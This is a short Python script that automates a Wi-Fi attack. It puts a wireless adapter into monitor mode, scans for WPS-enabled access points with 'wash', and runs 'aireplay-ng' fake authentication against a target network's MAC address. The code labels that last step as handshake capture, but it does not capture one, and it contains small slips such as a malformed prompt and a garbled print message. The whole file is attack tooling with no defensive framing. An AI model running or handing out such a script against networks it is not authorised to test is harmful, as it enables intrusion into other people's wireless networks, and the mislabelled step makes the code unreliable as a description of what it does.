#!/usr/bin/env python
"""Modules"""
import subprocess
import sys

"""variables"""
adapter = input("[+] Input wifi adapter or wireless card: ")


def monitor_mode(interface): 
    '''enable monitor mode '''
    print(f'changing {interface} to monitor mode')
    subprocess.call(['ifconfig', interface, 'down'])
    subprocess.call(['iwconfig', interface, 'mode', 'monitor'])
    subprocess.call(['ifconfig', interface, 'up'])

def check_wps(interface): 
    """Check for Wps enabled"""
    print(f"using {interface} to check for wps")
    subprocess.call(['wash', '--interface', interface])

def handshake(adapter): 
    """capture handshake"""
    print("print capturing handshake")
    wifi_mac = input("[+] Input wifi mac address: ")
    adapter_mac = input("[+ Input adapter mac: ")
    subprocess.call(['aireplay-ng','-1', '30', '-a', wifi_mac, '-h', adapter_mac, adapter])
try:
    monitor_mode(adapter)
    check_wps(adapter)
except KeyboardInterrupt:
    pass

handshake(adapter)
